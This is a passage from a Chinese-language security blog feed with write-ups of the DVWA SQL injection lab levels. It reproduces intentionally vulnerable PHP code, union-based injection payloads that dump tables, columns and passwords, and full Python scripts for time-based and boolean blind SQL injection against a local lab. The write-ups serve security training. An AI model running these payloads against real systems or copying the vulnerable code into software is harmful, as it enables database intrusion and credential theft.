if(ascii(substr(database(),%d,1))=%d,1,sleep(5))#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        t=r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of'</span>,chr(j),<span class="string">'is'</span>,t)</span><br><span class="line">        <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">            database=database+chr(j)</span><br><span class="line">            print(<span class="string">'The name of database is:'</span>,database)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据表总长度:15</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>,<span class="number">16</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=%d,1,sleep(5))#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    r=requests.post(url,data=data)</span><br><span class="line">    t=r.elapsed.total_seconds()</span><br><span class="line">    print(t)</span><br><span class="line">    <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">        table_length=i</span><br><span class="line">        print(<span class="string">'The length of table is:'</span>,table_length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据表名:guestbook,users</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d,1,sleep(3))#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        t=r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of'</span>,chr(j),<span class="string">'is:'</span>,t)</span><br><span class="line">        <span class="keyword">if</span>(t&lt;<span class="number">3</span>):</span><br><span class="line">            table_name=table_name+chr(j)</span><br><span class="line">            print(<span class="string">'The name of table is:'</span>,table_name)</span><br><span class="line">            flag=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">122</span>):</span><br><span class="line">                table_name=table_name+<span class="string">','</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据列总长度:94</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">90</span>,<span class="number">100</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and length((select group_concat(column_name) from information_schema.columns where table_name='users'))=%d#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    r=requests.post(url,data=data)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> r.text):</span><br><span class="line">        column_length=i</span><br><span class="line">        print(column_length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据列名:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">95</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),%d,1))=%d#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            column_name=column_name+chr(j)</span><br><span class="line">            print(<span class="string">"The name of column is:"</span>,column_name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">122</span>):</span><br><span class="line">                column_name=column_name+<span class="string">','</span></span><br></pre></td></tr></table></figure><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">$id=$_POST[&apos;id&apos;];</span><br><span class="line">$id=mysql_real_escape_string($id);</span><br><span class="line">$sql=&quot;SELECT first_name,last_name FROM users where user_id=$id&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br><span class="line">if($row)&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>跟之前关卡区别只在于id未被引号包裹，稍微修改一下注入语句，跟之前关卡没什么区别，这里就不贴脚本了，参考上面的代码即可</p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">include(&quot;sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if (isset($_SESSION[&apos;id&apos;]))&#123;</span><br><span class="line">$id=$_SESSION[&apos;id&apos;];</span><br><span class="line">$sql=&quot;SELECT first_name , last_name FROM users where user_id=&apos;$id&apos;&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br><span class="line">if($row)&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>有两个页面，一个页面用来接收post的id值并赋值给session的id值，主页面接受session的id值进行查询</p><p>这里的脚本需要特别注意一点，因为是两个页面，所以要把post的数据提交给input页面，然后再访问index主页面，这就需要利用到requests库的Session对象</p><p>以获取数据库名长度为例子说明：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and if(length(database())=%d,1,sleep(5))#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    s=requests.Session()</span><br><span class="line">    s.post(url_input,data=data)</span><br><span class="line">    r=s.get(url_index)</span><br><span class="line">    t=r.elapsed.total_seconds()</span><br><span class="line">    <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">        database_length=i</span><br><span class="line">        print(<span class="string">'The length of database is:'</span>,database_length)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>先创建一个Session对象，利用该对象将数据post到input页面，然后再通过Session对象访问index页面</p><p>其他的改法类似，就不一一赘述了</p><p>下面贴上本关完整脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url_input=<span class="string">"http://127.0.0.1/demo/session-input.php"</span></span><br><span class="line">url_index=<span class="string">"http://127.0.0.1/demo/sqli(blind)-high.php"</span></span><br><span class="line"></span><br><span class="line">database_length=<span class="number">0</span></span><br><span class="line">table_length=<span class="number">0</span></span><br><span class="line">column_length=<span class="number">0</span></span><br><span class="line">database=<span class="string">''</span></span><br><span class="line">table_name=<span class="string">''</span></span><br><span class="line">column_name=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库长度:4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and if(length(database())=%d,1,sleep(5))#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    s=requests.Session()</span><br><span class="line">    s.post(url_input,data=data)</span><br><span class="line">    r=s.get(url_index)</span><br><span class="line">    t=r.elapsed.total_seconds()</span><br><span class="line">    <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">        database_length=i</span><br><span class="line">        print(<span class="string">'The length of database is:'</span>,database_length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库名:dvwa</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and if(ascii(substr(database(),%d,1))=%d,1,sleep(5))#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        s=requests.Session()</span><br><span class="line">        s.post(url_input,data=data)</span><br><span class="line">        r=s.get(url_index)</span><br><span class="line">        t=r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of'</span>,chr(j),<span class="string">'is'</span>,t)</span><br><span class="line">        <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">            database=database+chr(j)</span><br><span class="line">            print(<span class="string">'The name of database is:'</span>,database)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据表总长度:15</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>,<span class="number">16</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=%d,1,sleep(5))#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    s=requests.Session()</span><br><span class="line">    s.post(url_input,data=data)</span><br><span class="line">    r=s.get(url_index)</span><br><span class="line">    t=r.elapsed.total_seconds()</span><br><span class="line">    print(t)</span><br><span class="line">    <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">        table_length=i</span><br><span class="line">        print(<span class="string">'The length of table is:'</span>,table_length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据表名:guestbook,users</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d,1,sleep(3))#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        s=requests.Session()</span><br><span class="line">        s.post(url_input,data=data)</span><br><span class="line">        r=s.get(url_index)</span><br><span class="line">        t=r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of'</span>,chr(j),<span class="string">'is:'</span>,t)</span><br><span class="line">        <span class="keyword">if</span>(t&lt;<span class="number">3</span>):</span><br><span class="line">            table_name=table_name+chr(j)</span><br><span class="line">            print(<span class="string">'The name of table is:'</span>,table_name)</span><br><span class="line">            flag=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">122</span>):</span><br><span class="line">                table_name=table_name+<span class="string">','</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据列总长度:94</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">90</span>,<span class="number">100</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and length((select group_concat(column_name) from information_schema.columns where table_name='users'))=%d#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    s=requests.Session()</span><br><span class="line">    s.post(url_input,data=data)</span><br><span class="line">    r=s.get(url_index)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> r.text):</span><br><span class="line">        column_length=i</span><br><span class="line">        print(column_length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据列名:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">95</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),%d,1))=%d#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        s=requests.Session()</span><br><span class="line">        s.post(url_input,data=data)</span><br><span class="line">        r=s.get(url_index)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            column_name=column_name+chr(j)</span><br><span class="line">            print(<span class="string">"The name of column is:"</span>,column_name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">122</span>):</span><br><span class="line">                column_name=column_name+<span class="string">','</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      dvwa-sql
    
    </summary>
    
      <category term="dvwa-sql" scheme="https://Foxgrin.github.io/categories/dvwa-sql/"/>
    
    
      <category term="sql" scheme="https://Foxgrin.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-sql</title>
    <link href="https://Foxgrin.github.io//posts/39291/"/>
    <id>https://Foxgrin.github.io//posts/39291/</id>
    <published>2018-07-10T13:44:00.000Z</published>
    <updated>2018-07-11T07:21:27.549Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中的sql注入关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include (&quot;sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&apos;id&apos;]) &amp;&amp; isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">$id=$_POST[&apos;id&apos;];</span><br><span class="line">$sql=&quot;SELECT first_name , last_name FROM users WHERE user_id=&apos;$id&apos;&quot;;</span><br><span class="line">$result=mysql_query($sql) or die(mysql_error());</span><br><span class="line">while($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">$first=$row[&apos;first_name&apos;];</span><br><span class="line">$last=$row[&apos;last_name&apos;];</span><br><span class="line">echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这关毫无过滤的sql语句</p><p>提示输入id，判断可能是数字型注入</p><p>输入1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再输入1’</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>出现报错，从错误信息判断是数字型注入，且被单引号包裹 </p><p>输入1’#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>没有报错</p><p>接下来判断查询字段数</p><p>输入1’ order by 3</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>说明查询字段数为2</p><p>那么就用联合查询来爆库</p><p>输入0’ union select database(),2 #</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入0’ union select group_concat(table_name),2 from information_schema.tables where table_schema=database()#</p><p>爆表</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入0’ union select group_concat(column_name),2 from information_schema.columns where table_name=’users’#</p><p>爆列</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入0’ union select password,user_id from users #</p><p>爆数据</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">$id=$_POST[&apos;id&apos;];</span><br><span class="line">$id=mysql_real_escape_string($id);</span><br><span class="line">$sql=&quot;SELECT first_name,last_name FROM users where user_id=$id&quot;;</span><br><span class="line">$result=mysql_query($sql) or die(mysql_error());</span><br><span class="line">while($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">$first=$row[&apos;first_name&apos;];</span><br><span class="line">$last=$row[&apos;last_name&apos;];</span><br><span class="line">echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这关很明显是数字型注入，通过选择表单中的数字作为注入点，我们可以用burp抓包修改post的id值</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这里id值虽然通过mysql_real_escape函数被转义处理，但是由于id没有被引号包裹，所以没有什么区别</p><p>先判断查询字段数</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>字段数为2</p><p>接下来爆库</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆表</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆列</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>因为这里单引号被包裹，所以users可以转成十六进制数从而绕过转义 </p><p>爆数据</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>这关有两个页面，一个页面用来输入id值，输入的id值经过sql查询后的信息显示在主页面上</p><p>输入id值的页面代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;id&apos;]) &amp;&amp; isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">$_SESSION[&apos;id&apos;]=$_POST[&apos;id&apos;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;Session ID:&quot;.$_SESSION[&apos;id&apos;];</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>主页面代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">include(&quot;sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if (isset($_SESSION[&apos;id&apos;]))&#123;</span><br><span class="line">$id=$_SESSION[&apos;id&apos;];</span><br><span class="line">$sql=&quot;SELECT first_name , last_name FROM users where user_id=&apos;$id&apos;&quot;;</span><br><span class="line">$result=mysql_query($sql) or die(mysql_error());</span><br><span class="line">while($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">$first=$row[&apos;first_name&apos;];</span><br><span class="line">$last=$row[&apos;last_name&apos;];</span><br><span class="line">echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这关把post的id值赋值给session的id值</p><p>注入点仍然是id值</p><p>跟上面关卡没什么本质区别</p><p>爆库</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆表</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆列</p><figure class="image-bubble">                <div class="img-lightbox">                    <div 